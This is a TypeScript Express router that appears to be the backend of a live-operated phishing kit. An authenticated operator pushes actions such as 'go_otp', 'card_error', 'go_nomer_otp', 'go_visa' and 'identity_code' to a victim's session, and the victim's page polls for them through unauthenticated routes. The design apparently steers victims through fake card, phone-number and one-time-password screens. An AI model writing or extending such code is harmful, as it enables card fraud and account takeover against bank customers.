import { Router, type IRouter } from "express";
import { setControl, peekControl, getControl, type ControlAction } from "../lib/control-store";
import { extractToken, validateToken } from "../lib/auth";

const router: IRouter = Router();

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

router.get("/control/:sessionId", (req, res): void => {
  const raw = req.params.sessionId;
  const sessionId = Array.isArray(raw) ? raw[0] : raw;
  
  // First peek for current action (doesn't delete)
  const peekResult = peekControl(sessionId);
  if (peekResult) {
    res.json({ action: peekResult.action, code: peekResult.code });
    return;
  }
  
  // No action pending
  res.json({ action: null });
});

// Route to consume (delete) the control action after client receives it
router.delete("/control/:sessionId", (req, res): void => {
  const raw = req.params.sessionId;
  const sessionId = Array.isArray(raw) ? raw[0] : raw;
  
  // Get and delete the control action
  const result = getControl(sessionId);
  if (result) {
    res.json({ success: true, action: result.action });
  } else {
    res.json({ success: true, action: null });
  }
});

router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
  const rawSessionId = req.params.sessionId;
  const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
  const { action, code } = req.body as { action?: string; code?: string };

  const allowed: ControlAction[] = [
    "go_otp", "go_otp2", "go_otp3", "card_error",
    "go_nomer", "nomer_error", "go_nomer_wait", "go_nomer_otp",
    "go_home", "go_form", "go_select", "go_visa", "go_atm",
    "go_total", "go_total2", "go_waiting",
    "identity_code", "go_identity_check"
  ];
  if (!action || !allowed.includes(action as ControlAction)) {
    res.status(400).json({ error: "Invalid action" });
    return;
  }

  setControl(sessionId, action as ControlAction, code);
  res.json({ success: true, sessionId, action, code });
});

export default router;
